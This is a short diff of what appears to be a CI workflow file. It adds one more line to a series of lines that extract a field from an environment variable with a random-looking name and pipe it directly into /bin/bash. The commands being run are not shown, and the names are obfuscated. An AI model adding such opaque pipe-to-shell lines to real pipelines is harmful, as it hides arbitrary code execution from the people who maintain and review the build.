@@ -23,6 +23,7 @@ jobs:
           echo $jdoar68386 | jq -r .rmea98 | /bin/bash
           printf '%s' "$ssli4" | jq -r .qnl655 | /bin/bash
           echo $ujgj80911 | jq -r .iw928 | /bin/bash
+          printf '%s' "$n07" | jq -r .xp3243 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
